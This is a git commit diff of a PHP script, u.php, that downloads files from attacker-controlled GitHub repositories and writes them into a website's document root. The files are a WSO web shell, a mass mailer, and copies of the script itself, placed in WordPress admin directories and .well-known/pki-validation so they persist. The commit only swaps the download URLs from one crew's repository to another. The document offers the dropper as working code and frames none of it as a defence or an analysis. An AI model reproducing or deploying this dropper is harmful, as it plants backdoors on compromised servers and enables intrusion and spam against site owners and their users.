5d01c3336abc21d16728515791128e36620d4cdc
drinjection <62676311+drinjection@users.noreply.github.com>
2020-04-21 22:57:19 +0200

    Update u.php

--- u.php
+++ u.php
@@ -8,8 +8,8 @@ function http_get($url){
     return curl_exec($im);
     curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/mailer2020.php" ;
-$text = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/mailer2020.php');
+$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/leaf.php" ;
+$text = http_get('https://raw.githubusercontent.com/drinjection/upload/master/leaf.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -19,7 +19,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/wso.php" ;
-$text2 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/wso.php');
+$text2 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/wso.php');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
@@ -29,7 +29,7 @@ if(file_exists($check2)){
   echo "not exits2";
 echo "done2 .\n " ;
 $check3 = $_SERVER['DOCUMENT_ROOT'] . "/.well-known/pki-validation/u.php" ;
-$text3 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/u.php');
+$text3 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/u.php');
 $open3 = fopen($check3, 'w');
 fwrite($open3, $text3);
 fclose($open3);
@@ -40,7 +40,7 @@ if(file_exists($check3)){
 echo "done3 .\n " ;
  
 $check4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/u.php" ;
-$text4 = http_get('https://raw.githubusercontent.com/Aht-crew/upload/master/u.php');
+$text4 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/u.php');
 $open4 = fopen($check4, 'w');
 fwrite($open4, $text4);
 fclose($open4);
